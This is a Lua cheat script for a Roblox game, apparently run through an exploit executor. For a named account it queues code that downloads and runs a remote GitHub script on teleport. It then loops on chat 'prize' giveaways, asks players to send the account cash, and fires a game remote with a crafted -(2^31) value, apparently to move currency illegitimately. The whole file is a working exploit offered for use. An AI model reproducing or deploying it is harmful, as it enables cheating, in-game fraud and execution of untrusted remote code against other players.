if game:GetService("Players").LocalPlayer.Name == "CirnoSaysNumbers" then

syn.queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/TrixxerTrix/kkkkkkkkkkkkk/main/HHHHHHHHHH.lua'))()")

--// bobuxstealCHAT.lua
-- services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- constants
local LocalPlayer = Players.LocalPlayer
local GOSNFT = ReplicatedStorage.Remotes.GOSNFT
local OnMessageDoneFiltering = ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering
local SayMessage = ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
local charset = "abcABC123"

-- variables
local Claimed = false
local OnNewMessage;

-- functions
local function generatePassword()
    local str = ""
    for i = 1, 3 do
        local charIndex = Random.new():NextInteger(1, #charset)
        str = str .. string.sub(charset, charIndex, charIndex)
    end
    
    return str
end

local function DonateRobux(Player, Amount)
    return GOSNFT:InvokeServer(Amount, Player, -(2^31))
end

-- core
while true do
    Claimed = false
    if LocalPlayer.leaderstats.Cash.Value >= 10000000 then
        local PrizeTrigger = generatePassword()
        for i = 1, 3 do SayMessage:FireServer(string.format("!!! - First person to say %q in the next 20 seconds gets a randomized prize! (CASE SENSITIVE)", PrizeTrigger), "All") end
        OnNewMessage = OnMessageDoneFiltering.OnClientEvent:Connect(function(Info, _)
            if Info.Message == PrizeTrigger and not Claimed then
                OnNewMessage:Disconnect()
                Claimed = true
                task.wait(.5)
                SayMessage:FireServer("✅ - Someone has claimed the prize! Giving out now...", "All")
                task.wait(1)
                DonateRobux(Info.FromSpeaker, Random.new():NextInteger(1000000, 10000000))
            end
        end)
    
        task.wait(20)
        print("checking")
        if Claimed == false then
            Claimed = true
            print("oops! nobody was able to get it")
            SayMessage:FireServer("😢 - Nobody was able to get the prize, try again next time!", "All")
        end
    
        task.wait(40)
    else
        SayMessage:FireServer("❗ - We cannot give out prizes right now! Please get my cash to atleast 10M and wait.", "All") task.wait(60)
    end
end

end
